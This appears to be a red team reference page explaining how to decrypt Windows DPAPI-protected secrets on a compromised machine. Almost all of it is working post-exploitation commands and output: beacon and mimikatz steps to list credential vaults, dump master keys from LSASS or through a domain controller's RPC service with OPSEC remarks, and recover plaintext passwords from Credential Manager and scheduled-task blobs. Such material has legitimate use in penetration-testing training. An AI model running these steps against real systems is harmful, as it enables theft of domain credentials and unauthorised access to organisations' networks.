---
title: Data Protection API (DPAPI)
category: Red Team
order: 12
---

The Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting data blobs. It uses cryptographic kyes and allows both native Windows functionality and third-party applications to protect/unprotect data transparently to the user.

DPAPI is used by the Windows Credential Manager to sotre saved secrets such as RDP credential, and by third-party applications like Google Chrome.


# Credential Manager

The credential manager blobs are stored in user's `AppData` directory.

With `vaultcmd` tool we can list them.

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/srv-1
Identity: CORP\user
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

Or with mimikatz.

```
beacon> mimikatz vault::list
```

The masterkey with which the blobs have been encrypted are stored encryppted in the following path.

```
beacon> ls C:\Users\user\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 372b     fil     02/25/2021 13:07:38   9D54C839752B38B233E5D56FDD7891A7
 10kb     fil     02/21/2021 11:49:40   DFBE70A7E5CC19A398EBF1B96859CE5D
```

> **Note**: Each user including system has their independent blob. Remember to list vaults with all the contexts.

## Decrypt the credentials

To decrypt the credentials we need to find the master encryption key.

Run mimikatz `dpapi` and provide the location to the blob on disk.

```
beacon> mimikatz dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7

**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619[...snip...]b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985
```

The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it. The masterkey information is stored in the following directory specifying the user SID.

```
beacon> ls C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1122

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 928b     fil     02/21/2021 11:49:40   BK-CORP
 24b      fil     02/21/2021 11:49:40   Preferred
```

It is possible to dump the masterkey from memory with `sekurlsa::dpapi` on a high integrity session, but this interacts with LSASS which is not ideal for OPSEC.

There are more silent ways such us using the RPC service exposed on the DC.

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc

[domainkey] with RPC
[DC] 'corp.local' will be the domain
[DC] 'dc.corp.local' will be the DC server
  key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
  sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```
Once the `key` is obtained we can decyrpt the credential with `dpapi::cred`.

```
beacon> mimikatz dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df

Decrypting Credential:
 [...snip...]
  UserName       : CORP\user
  CredentialBlob : Passw0rd!
```

# Scheduled Task Credentials

Scheduled task can save credentials so they can run under the context of a user without them having to be logged on. If we have compromised a machine as a local admin, we can decrypt them in the same way as the credential manager.

The blobs are saved under `C:\Windows\Sytem32\config\systemprofile\AppData\Local\Microsoft\Credentials`.

```
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 10kb     fil     08/28/2022 02:42:24   DFBE70A7E5CC19A398EBF1B96859CE5D
 527b     fil     08/17/2022 04:55:28   F3190EBE0498B77B4A85ECBABCA19B6E
```

With `dpapi::cred` can tell us the GUID of the master key used to encrypt each one.

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
```

`sekurlsa::dpapi` to dump cached keys:

```
beacon> mimikatz !sekurlsa::dpapi

	 [00000000]
	 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	9/6/2022 12:14:38 PM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
```

And finally decrypt it.

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UserName       : CORP\user
  CredentialBlob : Passw0rd!
```